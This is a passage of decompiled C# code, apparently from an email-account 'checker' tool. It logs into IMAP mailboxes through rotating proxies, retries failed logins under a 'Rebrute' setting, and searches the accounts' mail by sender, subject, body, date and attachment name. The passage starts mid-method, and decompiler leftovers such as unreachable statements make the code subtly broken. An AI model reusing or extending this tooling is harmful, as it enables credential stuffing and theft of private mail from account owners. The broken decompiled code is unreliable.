							{
								throw;
							}
							catch
							{
							}
						}
					}
					IL_1AC2:
					l = i;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch (Exception)
			{
				return OperationResult.Error;
			}
			return OperationResult.Ok;
		}

		// Token: 0x06000916 RID: 2326 RVA: 0x000386B8 File Offset: 0x000368B8
		private SearchCondition BuildSearchCondition(Request request)
		{
			SearchCondition searchCondition = new SearchCondition();
			if (request.Sender == null)
			{
				if (request.Subject != null)
				{
					searchCondition = SearchCondition.Subject(request.Subject);
					if (request.Sender != null)
					{
						searchCondition &= SearchCondition.From(request.Sender);
					}
					if (request.Body != null)
					{
						searchCondition &= SearchCondition.Body(request.Body);
					}
				}
				else if (request.Body != null)
				{
					searchCondition = SearchCondition.Body(request.Body);
					if (request.Sender != null)
					{
						searchCondition &= SearchCondition.From(request.Sender);
					}
					if (request.Subject != null)
					{
						searchCondition &= SearchCondition.Subject(request.Subject);
					}
				}
			}
			else
			{
				searchCondition = SearchCondition.From(request.Sender);
				if (request.Subject != null)
				{
					searchCondition &= SearchCondition.Subject(request.Subject);
				}
				if (request.Body != null)
				{
					searchCondition &= SearchCondition.Body(request.Body);
				}
			}
			if (!request.CheckDate)
			{
				if (SearchSettings.Instance.CheckDate)
				{
					if (SearchSettings.Instance.DateFrom != null)
					{
						searchCondition &= SearchCondition.SentSince(SearchSettings.Instance.DateFrom.Value);
					}
					if (SearchSettings.Instance.DateTo != null)
					{
						searchCondition &= SearchCondition.SentBefore(SearchSettings.Instance.DateTo.Value.AddDays(1.0));
					}
				}
			}
			else
			{
				if (request.DateFrom != null)
				{
					searchCondition &= SearchCondition.SentSince(request.DateFrom.Value);
				}
				if (request.DateTo != null)
				{
					searchCondition &= SearchCondition.SentBefore(request.DateTo.Value.AddDays(1.0));
				}
			}
			return searchCondition;
		}

		// Token: 0x06000917 RID: 2327 RVA: 0x000388B0 File Offset: 0x00036AB0
		private bool ValidateDate(Request request, DateTime date)
		{
			if (request.CheckDate)
			{
				if (request.DateFrom != null && date < request.DateFrom.Value)
				{
					return false;
				}
				if (request.DateTo != null && date > request.DateTo.Value.AddDays(1.0))
				{
					return false;
				}
			}
			else if (SearchSettings.Instance.CheckDate)
			{
				if (SearchSettings.Instance.DateFrom != null && date < SearchSettings.Instance.DateFrom.Value)
				{
					return false;
				}
				if (SearchSettings.Instance.DateTo != null && date > SearchSettings.Instance.DateTo.Value.AddDays(1.0))
				{
					return false;
				}
			}
			return true;
		}

		// Token: 0x06000918 RID: 2328 RVA: 0x000389A8 File Offset: 0x00036BA8
		private bool IsValidAttachmentMessage(AttachmentMessageInfo attachmentMessage)
		{
			if (!attachmentMessage.HasAttachments)
			{
				return false;
			}
			if (SearchSettings.Instance.UseAttachmentFilters)
			{
				using (List<string>.Enumerator enumerator = attachmentMessage.Filenames.GetEnumerator())
				{
					while (enumerator.MoveNext())
					{
						string filename = enumerator.Current;
						if (SearchSettings.Instance.AttachmentFilters.Any((string filter) => filename.ContainsIgnoreCase(filter)))
						{
							return true;
						}
					}
					return false;
				}
				bool result;
				return result;
			}
			return true;
		}

		// Token: 0x06000919 RID: 2329 RVA: 0x00038A3C File Offset: 0x00036C3C
		private bool Reconnect()
		{
			for (int i = 0; i < CheckerSettings.Instance.Rebrute + 1; i++)
			{
				if (ProxySettings.Instance.UseProxy)
				{
					OperationResult operationResult = this.CreateConnection();
					if (operationResult != OperationResult.HostNotFound)
					{
						if (operationResult != OperationResult.Error)
						{
							goto IL_24;
						}
					}
					return false;
				}
				IL_24:
				this.WaitPause();
				ExceptionType exceptionType;
				OperationResult operationResult2 = this.Login(out exceptionType);
				if (operationResult2 == OperationResult.Ok)
				{
					return true;
				}
				if (operationResult2 == OperationResult.Blocked)
				{
					return false;
				}
				if (operationResult2 != OperationResult.Error)
				{
					this._imapClient.Dispose();
					return false;
				}
				this._imapClient.Dispose();
			}
			return false;
		}

		// Token: 0x0600091A RID: 2330 RVA: 0x00038ABC File Offset: 0x00036CBC
		private OperationResult CreateConnection()
		{
			OperationResult operationResult;
			do
			{
				this.WaitPause();
				ProxyClient proxy = ProxyManager.Instance.GetProxy();
				operationResult = this.Connect(proxy);
			}
			while (operationResult == OperationResult.Error);
			return operationResult;
		}

		// Token: 0x0600091B RID: 2331 RVA: 0x0000B875 File Offset: 0x00009A75
		public void Dispose()
		{
			this._imapClient.Dispose();
		}

		// Token: 0x0600091C RID: 2332 RVA: 0x0000B882 File Offset: 0x00009A82
		private bool IsAdditionalCheckRequired()
		{
			return CheckerSettings.Instance.UseRebruteDomainFilters && CheckerSettings.Instance.RebruteDomainFilters.Any((DomainFilter filter) => filter.Domain.EqualsIgnoreCase(this._mailbox.Domain) && filter.IsEnabled);
		}

		// Token: 0x0600091D RID: 2333 RVA: 0x00009AC8 File Offset: 0x00007CC8
		private void WaitPause()
		{
			ThreadsManager.Instance.WaitHandle.WaitOne();
		}

		// Token: 0x04000471 RID: 1137
		private TcpClient _tcpClient;

		// Token: 0x04000472 RID: 1138
		private Mailbox _mailbox;

		// Token: 0x04000473 RID: 1139
		private Server _server;

		// Token: 0x04000474 RID: 1140
		private ImapClient _imapClient;

		// Token: 0x04000475 RID: 1141
		private List<Folder> _allFolders;
	}
}
